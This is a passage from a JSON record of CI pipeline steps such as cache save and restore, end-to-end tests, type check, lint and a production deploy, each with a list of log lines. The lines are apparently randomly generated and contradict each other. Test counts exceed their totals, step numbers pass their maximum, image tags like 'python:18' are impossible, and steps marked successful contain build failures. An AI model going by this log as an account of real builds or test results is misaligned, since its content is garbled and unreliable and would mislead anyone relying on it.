          "Ran 76 tests in 57s",
          "WARNING: react has known vulnerabilities",
          "WARNING: prettier has known vulnerabilities",
          "\u2713 Step 'setup' succeeded",
          "Loading...",
          "Compiling lib/main.py...",
          "Installing axios@3.2.6",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "yarn add: Done in 27.69s",
          "Processing...",
          "yarn add: Done in 11.52s",
          "[12:46:31] INFO: Cache refreshed",
          "Step 6/15: Running migrations",
          "[12:46:31] DEBUG: Loading configuration",
          "Cache invalidated: build",
          "POST /api - 200 (12ms)",
          "Done.",
          "[12:46:31] WARN: Deprecated API usage",
          "Installing eslint@5.8.3",
          "Using Node.js 17.18.8",
          "NODE_ENV=development",
          "Ready.",
          "Cache restored successfully (145MB)",
          "Cache invalidated: build",
          "WARNING: prettier has known vulnerabilities",
          "  PASS: test_cache_hit (186ms)",
          "POST /api - 202 (256ms)",
          "Minifying vendor.js",
          "Generating source maps...",
          "Test Suites: 31 passed, 10 total",
          "Artifact downloaded: 26MB",
          "Processing...",
          "npm install: added 184 packages",
          "POST /api - 200 (280ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Artifact uploaded: build.tar.gz (3MB)",
          "WARNING: webpack has known vulnerabilities",
          "Artifact uploaded: build.tar.gz (35MB)",
          "OK",
          "Compiling utils/handler.rs...",
          "[12:46:31] DEBUG: Query executed in 92ms",
          "  PASS: unit/test_cache_hit.spec.js",
          "Compiling lib/handler.rs...",
          "Time: 49.619s",
          "Pushing to registry...",
          "Layer 7/9: RUN command",
          "Uploading artifact 'dist' (37 files)",
          "pip: Downloading react-3.6.tar.gz",
          "Creating production build...",
          "Fetching submodules...",
          "Artifact uploaded: build.tar.gz (5MB)",
          "FAILED: test_cache_hit",
          "[12:46:31] WARN: Deprecated API usage",
          "pip: Downloading jest-4.11.tar.gz",
          "Processing...",
          "Cache miss for key-3669",
          "Switched to branch 'bugfix/task-977'",
          "Uploading artifact 'dist' (48 files)",
          "Verifying...",
          "Transforming 297 files...",
          "Building Docker image...",
          "\u2713 All checks passed",
          "[12:46:31] ERROR: Connection failed",
          "Step 8/24: Installing dependencies",
          "Building Docker image...",
          "pip: Downloading jest-1.4.tar.gz",
          "yarn add: Done in 14.22s",
          "Switched to branch 'feature/task-415'",
          "Using Node.js 16.10.0",
          "Artifact uploaded: dist.zip (13MB)",
          "POST /data - 202 (321ms)",
          "NODE_ENV=development",
          "Loading...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "[12:46:31] WARN: Deprecated API usage",
          "Processing...",
          "FAILED: test_auth_login",
          "[12:46:31] INFO: Cache refreshed",
          "Cache hit for key-3528",
          "npm notice: created a lockfile",
          "  PASS: integration/test_db_connect.spec.js",
          "Using Python 3.10",
          "HEAD is now at b4ddc9d",
          "Step 13/24: Linting",
          "Installing webpack@1.17.3",
          "Loading...",
          "Cache hit for key-2868",
          "GET /status - 201 (29ms)",
          "Cache saved successfully",
          "  PASS: test_user_create (351ms)",
          "Creating production build...",
          "Compiling utils/index.js...",
          "pip: Installing build dependencies...",
          "Ready.",
          "  PASS: test_user_create (336ms)",
          "Using Python 3.9",
          "Installing webpack@1.10.5",
          "Compiling components/service.java...",
          "Checking out master branch",
          "Already up to date.",
          "[12:46:31] DEBUG: Initializing service",
          "OK",
          "pip: Downloading react-3.3.tar.gz",
          "[12:46:31] WARN: Deprecated API usage",
          "=== Step upload_artifacts completed ==="
        ]
      },
      {
        "name": "save_cache",
        "status": "success",
        "started_at": "2025-11-28T12:49:05.458891",
        "finished_at": "2025-11-28T12:49:12.340598",
        "log_lines": [
          "=== Step: save_cache ===",
          "Done.",
          "Loading...",
          "Switched to branch 'bugfix/task-347'",
          "Already up to date.",
          "WARNING: react has known vulnerabilities",
          "[12:46:31] INFO: Request completed",
          "Cache invalidated: dependencies",
          "HEAD is now at 487214a",
          "Snapshots: 35 passed, 0 total",
          "Step 15/23: Running migrations",
          "Ready.",
          "Compiling lib/service.java...",
          "[12:46:31] DEBUG: Loading configuration",
          "Done.",
          "\u2713 All checks passed",
          "Image pulled successfully",
          "Test Suites: 42 passed, 33 total",
          "Artifact downloaded: 41MB",
          "Fetching from https://registry.npmjs.org/package.json",
          "Installing jest@4.3.5",
          "Ready.",
          "Step 5/21: Deploying",
          "NODE_ENV=test",
          "Step 17/15: Testing",
          "Platform: linux-x64",
          "Step 3/19: Linting",
          "[12:46:31] DEBUG: Initializing service",
          "Creating production build...",
          "Success!",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "GET /health - 204 (46ms)",
          "Using Node.js 20.18.1",
          "npm install: added 367 packages",
          "Connection established",
          "Fetching submodules...",
          "Creating production build...",
          "[12:46:31] INFO: Processing request",
          "WARNING: eslint has known vulnerabilities",
          "npm notice: package.json updated",
          "npm install: added 254 packages",
          "Verifying...",
          "\u2717 build failed with exit code 114",
          "Creating production build...",
          "Environment: development",
          "pip: Collecting express",
          "WARNING: prettier has known vulnerabilities",
          "Already up to date.",
          "Installing react@5.9.0",
          "[12:46:31] DEBUG: Loading configuration",
          "Exception: ValueError",
          "Transforming 167 files...",
          "Using Node.js 16.11.10",
          "Ran 179 tests in 36s",
          "WARNING: jest has known vulnerabilities",
          "Compiling lib/handler.rs...",
          "Cache miss for key-5943",
          "Bundling runtime.css",
          "\u2713 All checks passed",
          "\u2713 deploy completed",
          "  PASS: e2e/test_cache_hit.spec.js",
          "Environment: test",
          "Step 3/24: Building",
          "[12:46:31] WARN: Deprecated API usage",
          "npm install: resolved 1368 packages",
          "[12:46:31] DEBUG: Query executed in 72ms",
          "\u2713 Task completed in 3740ms",
          "Installing eslint@3.11.7",
          "Compiling lib/utils.go...",
          "[12:46:31] INFO: Processing request",
          "Step 16/22: Linting",
          "Connection established",
          "[12:46:31] DEBUG: Initializing service",
          "Processing...",
          "Exception: RuntimeError",
          "Already up to date.",
          "Fetching submodules...",
          "Ran 107 tests in 32s",
          "HEAD is now at d309abc",
          "[12:46:31] INFO: Cache refreshed",
          "Pulling image: python:18",
          "Processing...",
          "Time: 113.797s",
          "Finished.",
          "Minifying vendor.js",
          "GET /api - 204 (42ms)",
          "Completed.",
          "[12:46:31] WARN: Deprecated API usage",
          "[12:46:31] INFO: Cache refreshed",
          "Artifact downloaded: 21MB",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Platform: darwin-arm64",
          "[12:46:31] DEBUG: Query executed in 78ms",
          "pip: Collecting webpack",
          "TLS handshake completed",
          "Compiling src/main.py...",
          "Waiting...",
          "Fetching submodules...",
          "Transforming 143 files...",
          "\u2713 All checks passed",
          "Transforming 787 files...",
          "Finished.",
          "Artifact downloaded: 42MB",
          "npm install: added 166 packages",
          "Done.",
          "Completed.",
          "NODE_ENV=development",
          "\u2713 Task completed in 3439ms",
          "[12:46:31] WARN: Deprecated API usage",
          "TLS handshake completed",
          "Loading...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Connection established",
          "Compiling src/handler.rs...",
          "Ran 195 tests in 15s",
          "Artifact downloaded: 5MB",
          "Done.",
          "Cache restored successfully (406MB)",
          "Ready.",
          "Time: 50.127s",
          "HEAD is now at 5613b0e",
          "Artifact uploaded: dist.zip (78MB)",
          "[12:46:31] INFO: Processing request",
          "[12:46:31] WARN: Deprecated API usage",
          "\u2713 build completed",
          "Exception: TypeError",
          "POST /data - 202 (289ms)",
          "Uploading artifact 'build' (43 files)",
          "Already up to date.",
          "Waiting...",
          "pip: Downloading webpack-1.9.tar.gz",
          "Compiling components/handler.rs...",
          "Time: 4.994s",
          "=== Step save_cache completed ==="
        ]
      },
      {
        "name": "restore_cache",
        "status": "success",
        "started_at": "2025-11-28T12:49:12.340598",
        "finished_at": "2025-11-28T12:49:19.222305",
        "log_lines": [
          "=== Step: restore_cache ===",
          "Switched to branch 'hotfix/task-739'",
          "[12:46:31] INFO: Connecting to database",
          "Step 10/24: Testing",
          "Cache invalidated: dependencies",
          "Bundling main.css",
          "Switched to branch 'bugfix/task-853'",
          "Waiting...",
          "Waiting...",
          "Compiling utils/service.java...",
          "pip: Collecting lodash",
          "POST /api - 201 (172ms)",
          "yarn add: Done in 23.34s",
          "\u2717 build failed with exit code 19",
          "Time: 93.587s",
          "Platform: win32-x64",
          "Ready.",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "[12:46:31] DEBUG: Initializing service",
          "Checking out develop branch",
          "Minifying app.js",
          "WARNING: lodash has known vulnerabilities",
          "Installing eslint@1.11.9",
          "Building Docker image...",
          "HEAD is now at 6761ce5",
          "Cache hit for key-9453",
          "Uploading artifact 'dist' (38 files)",
          "Artifact uploaded: dist.zip (49MB)",
          "[12:46:31] DEBUG: Loading configuration",
          "WARNING: webpack has known vulnerabilities",
          "Verifying...",
          "Pulling image: node:18",
          "npm install: resolved 1365 packages",
          "\u2713 test completed",
          "Exception: TypeError",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Artifact uploaded: build.tar.gz (48MB)",
          "Compiling src/app.ts...",
          "\u2713 Task completed in 2111ms",
          "Cache saved successfully",
          "Uploading artifact 'dist' (42 files)",
          "Compiling lib/main.py...",
          "Step 8/16: Building",
          "HEAD is now at bca62a4",
          "Test Suites: 46 passed, 13 total",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Loading...",
          "Pulling image: node:latest",
          "Success!",
          "[12:46:31] INFO: Processing request",
          "Processing...",
          "[12:46:31] WARN: Deprecated API usage",
          "\u2713 All checks passed",
          "[12:46:31] INFO: Request completed",
          "Compiling components/main.py...",
          "\u2713 Task completed in 3682ms",
          "Compiling components/utils.go...",
          "npm notice: created a lockfile",
          "\u2713 package completed",
          "TLS handshake completed",
          "Layer 10/14: COPY command",
          "\u2713 Step 'test' succeeded",
          "\u2713 deploy completed",
          "Ran 48 tests in 31s",
          "Compiling utils/utils.go...",
          "Using Python 3.9",
          "Exception: NullPointerException",
          "Test Suites: 13 passed, 28 total",
          "Finished.",
          "Ran 91 tests in 21s",
          "FAILED: test_cache_hit",
          "Compiling lib/service.java...",
          "Uploading artifact 'coverage' (28 files)",
          "OK",
          "Test Suites: 28 passed, 42 total",
          "Layer 10/15: ENV command",
          "Using Python 3.9",
          "Layer 5/13: COPY command",
          "Pushing to registry...",
          "Exception: NullPointerException",
          "Completed.",
          "Platform: win32-x64",
          "Using Python 3.9",
          "[12:46:31] DEBUG: Query executed in 98ms",
          "Switched to branch 'feature/task-679'",
          "npm install: resolved 1409 packages",
          "Compiling utils/handler.rs...",
          "HEAD is now at d5c0df6",
          "[12:46:31] DEBUG: Query executed in 73ms",
          "\u2713 Step 'checkout' succeeded",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Installing webpack@3.18.1",
          "pip: Collecting react",
          "Switched to branch 'feature/task-688'",
          "Time: 22.937s",
          "[12:46:31] ERROR: Connection failed",
          "Uploading artifact 'coverage' (44 files)",
          "Cache invalidated: node_modules",
          "Artifact uploaded: dist.zip (6MB)",
          "Time: 5.761s",
          "npm notice: package.json updated",
          "[12:46:31] INFO: Request completed",
          "[12:46:31] INFO: Processing request",
          "Artifact downloaded: 20MB",
          "Transforming 934 files...",
          "Using Python 3.10",
          "[12:46:31] ERROR: Connection failed",
          "Using Node.js 19.8.7",
          "Creating production build...",
          "yarn add: Done in 23.10s",
          "Loading...",
          "\u2713 Task completed in 3213ms",
          "\u2713 deploy completed",
          "Step 1/18: Testing",
          "pip: Downloading jest-3.7.tar.gz",
          "  PASS: test_auth_login (266ms)",
          "Step 19/18: Deploying",
          "Waiting...",
          "Ran 111 tests in 17s",
          "Artifact uploaded: build.tar.gz (34MB)",
          "WARNING: prettier has known vulnerabilities",
          "Transforming 838 files...",
          "[12:46:31] INFO: Connecting to database",
          "[12:46:31] DEBUG: Query executed in 51ms",
          "[12:46:31] INFO: Connecting to database",
          "Pushing to registry...",
          "Pulling image: node:18",
          "[12:46:31] INFO: Request completed",
          "  PASS: unit/test_cache_hit.spec.js",
          "Compiling lib/handler.rs...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Verifying...",
          "=== Step restore_cache completed ==="
        ]
      },
      {
        "name": "e2e_tests",
        "status": "success",
        "started_at": "2025-11-28T12:49:19.222305",
        "finished_at": "2025-11-28T12:49:30.691817",
        "log_lines": [
          "=== Step: e2e_tests ===",
          "Ready.",
          "Step 10/22: Building",
          "[12:46:31] WARN: Deprecated API usage",
          "HEAD is now at 72acc7e",
          "Fetching submodules...",
          "Already up to date.",
          "Ready.",
          "Verifying...",
          "\u2717 build failed with exit code 18",
          "Fetching from https://github.com/package.json",
          "[12:46:31] INFO: Connecting to database",
          "Installing react@5.17.5",
          "Cache hit for key-5783",
          "Exception: NullPointerException",
          "[12:46:31] INFO: Connecting to database",
          "Step 1/20: Installing dependencies",
          "Building Docker image...",
          "Step 6/20: Linting",
          "Using Python 3.11",
          "Building Docker image...",
          "pip: Installing build dependencies...",
          "NODE_ENV=test",
          "\u2713 Step 'test' succeeded",
          "[12:46:31] DEBUG: Connection pool: 15 active",
          "Finished.",
          "NODE_ENV=production",
          "Compiling lib/utils.go...",
          "\u2713 Task completed in 4550ms",
          "[12:46:31] INFO: Starting build process",
          "[12:46:31] DEBUG: Loading configuration",
          "Waiting...",
          "  PASS: e2e/test_auth_login.spec.js",
          "Step 13/15: Linting",
          "Already up to date.",
          "Loading...",
          "Installing jest@4.6.0",
          "\u2713 All checks passed",
          "Cache saved successfully",
          "Step 20/24: Building",
          "Building Docker image...",
          "Test Suites: 47 passed, 48 total",
          "Platform: win32-x64",
          "[12:46:31] INFO: Connecting to database",
          "NODE_ENV=production",
          "Snapshots: 22 passed, 39 total",
          "Waiting...",
          "[12:46:31] DEBUG: Connection pool: 9 active",
          "[12:46:31] DEBUG: Loading configuration",
          "Loading...",
          "Completed.",
          "Compiling utils/app.ts...",
          "[12:46:31] DEBUG: Loading configuration",
          "[12:46:31] DEBUG: Connection pool: 13 active",
          "Artifact downloaded: 48MB",
          "Completed.",
          "Environment: development",
          "Step 1/20: Linting",
          "[12:46:31] DEBUG: Memory usage: 602MB",
          "Image pulled successfully",
          "Ran 109 tests in 2s",
          "Step 10/25: Linting",
          "pip: Downloading prettier-5.11.tar.gz",
          "Minifying app.js",
          "[12:46:31] DEBUG: Memory usage: 1842MB",
          "Exception: RuntimeError",
          "Tests: 466 passed, 268 total",
          "Pulling image: python:latest",
          "WARNING: prettier has known vulnerabilities",
          "[12:46:31] INFO: Connecting to database",
          "pip install: Successfully installed axios-2.2",
          "OK",
          "  PASS: test_user_create (469ms)",
          "pip: Downloading react-2.12.tar.gz",
          "Image pulled successfully",
          "Ran 47 tests in 37s",
          "Environment: staging",
          "Snapshots: 16 passed, 44 total",
          "Platform: darwin-arm64",
          "Ready.",
          "Ready.",
          "Waiting...",
          "Done.",
          "Connection established",
          "[12:46:31] DEBUG: Loading configuration",
          "Installing express@5.4.2",
          "Artifact uploaded: dist.zip (30MB)",
          "  PASS: unit/test_user_create.spec.js",
          "Building Docker image...",
          "Building Docker image...",
          "Finished.",
          "Test Suites: 35 passed, 43 total",
          "Using Python 3.11",
          "[12:46:31] DEBUG: Memory usage: 1637MB",
          "Step 13/23: Building",
          "\u2713 build completed",
          "WARNING: lodash has known vulnerabilities",
          "\u2713 Step 'checkout' succeeded",
          "Time: 63.651s",
          "\u2713 lint completed",
          "Uploading artifact 'dist' (5 files)",
          "[12:46:31] DEBUG: Initializing service",
          "Completed.",
          "Compiling src/app.ts...",
          "Cache invalidated: build",
          "\u2717 build failed with exit code 119",
          "WARNING: jest has known vulnerabilities",
          "pip: Collecting eslint",
          "Compiling lib/index.js...",
          "Compiling lib/index.js...",
          "Step 6/23: Testing",
          "Building Docker image...",
          "npm install: added 75 packages",
          "[12:46:31] ERROR: Connection failed",
          "OK",
          "yarn add: Done in 25.37s",
          "Using Node.js 14.5.8",
          "Loading...",
          "pip install: Successfully installed webpack-4.6",
          "Processing...",
          "Test Suites: 27 passed, 41 total",
          "pip install: Successfully installed lodash-4.8",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Connection established",
          "Cache hit for key-3129",
          "Compiling utils/index.js...",
          "Layer 9/11: RUN command",
          "npm install: added 333 packages",
          "WARNING: express has known vulnerabilities",
          "Finished.",
          "Snapshots: 18 passed, 48 total",
          "Building Docker image...",
          "Image pulled successfully",
          "=== Step e2e_tests completed ==="
        ]
      },
      {
        "name": "type_check",
        "status": "success",
        "started_at": "2025-11-28T12:49:30.691817",
        "finished_at": "2025-11-28T12:49:42.161329",
        "log_lines": [
          "=== Step: type_check ===",
          "POST /data - 201 (255ms)",
          "Cache saved successfully",
          "Bundling styles.css",
          "Ran 119 tests in 18s",
          "Artifact downloaded: 21MB",
          "Tests: 245 passed, 411 total",
          "Completed.",
          "Pushing to registry...",
          "Completed.",
          "Coverage: 96% statements, 64% branches",
          "FAILED: test_cache_hit",
          "Step 1/18: Installing dependencies",
          "Cache saved successfully",
          "Step 3/16: Installing dependencies",
          "Artifact uploaded: build.tar.gz (5MB)",
          "Building Docker image...",
          "Bundling main.css",
          "Compiling components/main.py...",
          "[12:46:31] INFO: Connecting to database",
          "Step 20/25: Installing dependencies",
          "npm install: added 40 packages",
          "NODE_ENV=development",
          "Coverage: 74% statements, 74% branches",
          "[12:46:31] INFO: Request completed",
          "Bundling main.js",
          "\u2713 Task completed in 578ms",
          "[12:46:31] WARN: Deprecated API usage",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Creating production build...",
          "Checking out master branch",
          "Processing...",
          "Cache invalidated: dependencies",
          "Using Node.js 15.2.5",
          "Transforming 221 files...",
          "Artifact uploaded: dist.zip (25MB)",
          "Compiling lib/index.js...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "  PASS: test_db_connect (112ms)",
          "Processing...",
          "Already up to date.",
          "Time: 98.68s",
          "WARNING: react has known vulnerabilities",
          "Step 8/22: Linting",
          "Step 12/20: Building",
          "Image pulled successfully",
          "Artifact uploaded: dist.zip (1MB)",
          "Cache invalidated: dependencies",
          "Uploading artifact 'build' (36 files)",
          "Success!",
          "Finished.",
          "[12:46:31] WARN: Deprecated API usage",
          "Fetching submodules...",
          "Waiting...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Fetching from https://npmjs.org/package.json",
          "Already up to date.",
          "  PASS: test_auth_login (159ms)",
          "pip: Collecting lodash",
          "Cache restored successfully (455MB)",
          "Ready.",
          "NODE_ENV=test",
          "[12:46:31] INFO: Cache refreshed",
          "Switched to branch 'hotfix/task-703'",
          "Cache restored successfully (28MB)",
          "NODE_ENV=test",
          "[12:46:31] DEBUG: Query executed in 44ms",
          "Platform: darwin-arm64",
          "NODE_ENV=development",
          "pip: Collecting lodash",
          "Compiling lib/handler.rs...",
          "TLS handshake completed",
          "\u2713 All checks passed",
          "pip: Collecting prettier",
          "npm install: resolved 1422 packages",
          "Compiling components/app.ts...",
          "HEAD is now at 5b477ee",
          "[12:46:31] WARN: Deprecated API usage",
          "Cache miss for key-6526",
          "[12:46:31] INFO: Connecting to database",
          "OK",
          "Success!",
          "[12:46:31] INFO: Cache refreshed",
          "Minifying app.js",
          "TLS handshake completed",
          "  PASS: unit/test_cache_hit.spec.js",
          "npm install: added 494 packages",
          "Pulling image: alpine:18",
          "npm notice: created a lockfile",
          "\u2713 All checks passed",
          "POST /api - 201 (348ms)",
          "  PASS: test_cache_hit (185ms)",
          "TLS handshake completed",
          "Fetching from https://githubusercontent.com/package.json",
          "Transforming 377 files...",
          "npm notice: package.json updated",
          "Step 14/16: Running migrations",
          "Already up to date.",
          "Compiling lib/index.js...",
          "Exception: ValueError",
          "\u2713 Step 'checkout' succeeded",
          "Bundling vendor.js",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "[12:46:31] DEBUG: Memory usage: 1960MB",
          "[12:46:31] DEBUG: Memory usage: 902MB",
          "[12:46:31] INFO: Request completed",
          "Snapshots: 48 passed, 12 total",
          "Already up to date.",
          "[12:46:31] WARN: Deprecated API usage",
          "Exception: RuntimeError",
          "[12:46:31] DEBUG: Query executed in 88ms",
          "Pushing to registry...",
          "[12:46:31] DEBUG: Memory usage: 1170MB",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "[12:46:31] INFO: Cache refreshed",
          "Bundling vendor.css",
          "Loading...",
          "\u2713 All checks passed",
          "Optimizing 95 modules...",
          "WARNING: prettier has known vulnerabilities",
          "pip: Installing build dependencies...",
          "Step 8/18: Installing dependencies",
          "Cache hit for key-8202",
          "[12:46:31] WARN: Deprecated API usage",
          "Cache saved successfully",
          "Optimizing 72 modules...",
          "Ready.",
          "Pushing to registry...",
          "Artifact uploaded: dist.zip (92MB)",
          "Ready.",
          "Snapshots: 14 passed, 29 total",
          "Cache hit for key-1256",
          "GET /api - 204 (97ms)",
          "=== Step type_check completed ==="
        ]
      },
      {
        "name": "lint",
        "status": "success",
        "started_at": "2025-11-28T12:49:42.161329",
        "finished_at": "2025-11-28T12:49:53.630841",
        "log_lines": [
          "=== Step: lint ===",
          "[12:46:31] WARN: Deprecated API usage",
          "\u2713 Task completed in 1686ms",
          "Waiting...",
          "Compiling utils/service.java...",
          "Artifact downloaded: 37MB",
          "Connection established",
          "FAILED: test_db_connect",
          "npm notice: created a lockfile",
          "WARNING: express has known vulnerabilities",
          "Pulling image: node:3.11",
          "Minifying app.js",
          "Uploading artifact 'coverage' (22 files)",
          "Finished.",
          "Installing axios@1.4.4",
          "Test Suites: 43 passed, 26 total",
          "Compiling lib/app.ts...",
          "Pushing to registry...",
          "Pushing to registry...",
          "Step 3/22: Installing dependencies",
          "Using Node.js 18.17.2",
          "[12:46:31] INFO: Starting build process",
          "Uploading artifact 'build' (22 files)",
          "Loading...",
          "Ran 10 tests in 38s",
          "WARNING: jest has known vulnerabilities",
          "Bundling vendor.js",
          "Cache restored successfully (45MB)",
          "npm notice: package.json updated",
          "FAILED: test_user_create",
          "npm install: added 475 packages",
          "\u2713 build completed",
          "[12:46:31] INFO: Starting build process",
          "Success!",
          "Minifying vendor.js",
          "Ran 197 tests in 49s",
          "Time: 87.504s",
          "[12:46:31] DEBUG: Initializing service",
          "Step 12/25: Deploying",
          "Completed.",
          "Minifying app.js",
          "Cache saved successfully",
          "Loading...",
          "Installing webpack@5.5.5",
          "Time: 35.313s",
          "[12:46:31] ERROR: Connection failed",
          "npm install: added 488 packages",
          "Processing...",
          "Uploading artifact 'dist' (16 files)",
          "npm install: resolved 1721 packages",
          "Minifying app.js",
          "Compiling src/service.java...",
          "Using Python 3.12",
          "WARNING: axios has known vulnerabilities",
          "Generating source maps...",
          "Uploading artifact 'build' (10 files)",
          "Layer 10/13: COPY command",
          "Compiling components/utils.go...",
          "Time: 63.606s",
          "Cache saved successfully",
          "[12:46:31] INFO: Connecting to database",
          "Fetching submodules...",
          "\u2717 build failed with exit code 52",
          "[12:46:31] ERROR: Connection failed",
          "Tests: 253 passed, 150 total",
          "Already up to date.",
          "[12:46:31] INFO: Connecting to database",
          "Creating production build...",
          "[12:46:31] WARN: Deprecated API usage",
          "Building Docker image...",
          "Exception: RuntimeError",
          "Step 9/18: Linting",
          "Step 18/22: Running migrations",
          "Layer 8/10: ENV command",
          "Compiling lib/utils.go...",
          "Success!",
          "Layer 9/9: ENV command",
          "Checking out develop branch",
          "[12:46:31] WARN: Deprecated API usage",
          "Platform: darwin-arm64",
          "Using Python 3.12",
          "GET /status - 200 (55ms)",
          "[12:46:31] DEBUG: Connection pool: 5 active",
          "Connection established",
          "[12:46:31] WARN: Deprecated API usage",
          "Environment: production",
          "[12:46:31] DEBUG: Query executed in 71ms",
          "Coverage: 88% statements, 74% branches",
          "Success!",
          "Image pulled successfully",
          "Compiling lib/app.ts...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "[12:46:31] DEBUG: Memory usage: 866MB",
          "Cache restored successfully (352MB)",
          "GET /status - 201 (79ms)",
          "Fetching from https://githubusercontent.com/package.json",
          "pip: Collecting lodash",
          "[12:46:31] INFO: Cache refreshed",
          "Compiling src/main.py...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "\u2713 package completed",
          "pip: Installing build dependencies...",
          "Completed.",
          "Creating production build...",
          "Cache restored successfully (365MB)",
          "HEAD is now at a957064",
          "TLS handshake completed",
          "Ran 160 tests in 40s",
          "WARNING: react has known vulnerabilities",
          "Done.",
          "Uploading artifact 'build' (33 files)",
          "Compiling lib/app.ts...",
          "Compiling lib/service.java...",
          "Test Suites: 21 passed, 10 total",
          "npm install: resolved 1658 packages",
          "Fetching submodules...",
          "OK",
          "Pulling image: node:3.11",
          "Bundling runtime.css",
          "Processing...",
          "  PASS: test_cache_hit (82ms)",
          "Using Node.js 14.12.2",
          "Layer 2/15: COPY command",
          "\u2713 Task completed in 463ms",
          "Environment: development",
          "Environment: staging",
          "Completed.",
          "\u2717 build failed with exit code 38",
          "Bundling styles.js",
          "Artifact uploaded: dist.zip (40MB)",
          "Artifact downloaded: 43MB",
          "Coverage: 79% statements, 85% branches",
          "npm notice: package.json updated",
          "=== Step lint completed ==="
        ]
      },
      {
        "name": "deploy_production",
        "status": "success",
        "started_at": "2025-11-28T12:49:53.630841",
        "finished_at": "2025-11-28T12:49:58.218646",
        "log_lines": [
          "=== Step: deploy_production ===",
          "npm install: added 419 packages",
          "Bundling runtime.css",
          "yarn add: Done in 17.99s",
          "[12:46:31] DEBUG: Initializing service",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "\u2717 build failed with exit code 49",
          "[12:46:31] WARN: Deprecated API usage",
          "npm notice: created a lockfile",
          "Compiling src/main.py...",
          "\u2713 Step 'checkout' succeeded",
          "Exception: NullPointerException",
          "[12:46:31] INFO: Starting build process",
          "Checking out master branch",
          "[12:46:31] DEBUG: Memory usage: 950MB",
          "Completed.",
          "Success!",
          "  PASS: test_auth_login (17ms)",
          "Bundling vendor.js",
          "Transforming 753 files...",
          "Using Node.js 17.16.5",
          "Compiling src/utils.go...",
          "[12:46:31] INFO: Cache refreshed",
          "[12:46:31] DEBUG: Connection pool: 11 active",
          "npm install: resolved 1438 packages",
          "\u2717 build failed with exit code 47",
          "Compiling utils/service.java...",
          "  PASS: test_api_health (291ms)",
          "Already up to date.",
          "Loading...",
          "Step 19/17: Linting",
          "Loading...",
          "[12:46:31] INFO: Processing request",
          "Bundling styles.js",
          "Verifying...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Compiling lib/app.ts...",
          "[12:46:31] INFO: Processing request",
          "Using Python 3.9",
          "[12:46:31] DEBUG: Memory usage: 272MB",
          "npm install: added 184 packages",
          "Completed.",
          "Using Node.js 20.9.5",
          "Checking out master branch",
          "Fetching from https://githubusercontent.com/package.json",
          "[12:46:31] INFO: Cache refreshed",
          "npm notice: created a lockfile",
          "Compiling lib/index.js...",
          "Success!",
          "Platform: linux-x64",
          "Environment: development",
          "Creating production build...",
          "Loading...",
          "\u2713 All checks passed",
          "Optimizing 14 modules...",
          "Building Docker image...",
          "Ready.",
          "[12:46:31] DEBUG: Memory usage: 844MB",
          "\u2713 Task completed in 889ms",
          "Success!",
          "WARNING: jest has known vulnerabilities",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "\u2713 Step 'install' succeeded",
          "Step 9/23: Testing",
          "Artifact downloaded: 7MB",
          "npm install: resolved 1022 packages",
          "Uploading artifact 'build' (45 files)",
          "pip: Downloading lodash-1.11.tar.gz",
          "HEAD is now at 26d2bbe",
          "Cache restored successfully (187MB)",
          "Artifact uploaded: build.tar.gz (45MB)",
          "Ready.",
          "NODE_ENV=production",
          "TLS handshake completed",
          "NODE_ENV=production",
          "Step 4/19: Running migrations",
          "npm notice: package.json updated",
          "[12:46:31] INFO: Connecting to database",
          "\u2713 All checks passed",
          "Step 8/23: Building",
          "pip: Collecting webpack",
          "\u2713 deploy completed",
          "pip install: Successfully installed axios-2.14",
          "Switched to branch 'hotfix/task-449'",
          "Using Node.js 19.18.8",
          "Step 18/22: Building",
          "[12:46:31] DEBUG: Initializing service",
          "[12:46:31] ERROR: Connection failed",
          "Compiling src/utils.go...",
          "Artifact downloaded: 15MB",
          "Checking out master branch",
          "Step 20/15: Linting",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Step 19/21: Installing dependencies",
          "Uploading artifact 'dist' (46 files)",
          "POST /data - 202 (108ms)",
          "Environment: staging",
          "[12:46:31] DEBUG: Initializing service",
          "[12:46:31] DEBUG: Loading configuration",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Using Python 3.11",
          "Pulling image: node:latest",
          "Optimizing 75 modules...",
          "Time: 20.686s",
          "Artifact uploaded: dist.zip (99MB)",
          "Step 16/18: Running migrations",
          "Finished.",
          "Waiting...",
          "Waiting...",
          "TLS handshake completed",
          "Artifact uploaded: build.tar.gz (46MB)",
          "[12:46:31] ERROR: Connection failed",
          "Creating production build...",
          "Already up to date.",
          "[12:46:31] INFO: Starting build process",
          "Finished.",
          "Step 17/21: Installing dependencies",
          "Ran 107 tests in 47s",
          "Bundling vendor.js",
          "yarn add: Done in 30.99s",
          "GET /health - 204 (81ms)",
          "Cache miss for key-1238",
          "npm install: added 184 packages",
          "Transforming 209 files...",
          "\u2713 package completed",
          "Step 4/15: Building",
          "Completed.",
          "Uploading artifact 'dist' (2 files)",
          "Already up to date.",
          "Pulling image: alpine:3.11",
          "[12:46:31] INFO: Connecting to database",
          "POST /upload - 200 (81ms)",
          "[12:46:31] DEBUG: Connection pool: 11 active",
          "=== Step deploy_production completed ==="
        ]
      },
      {
        "name": "integration_tests",
        "status": "success",
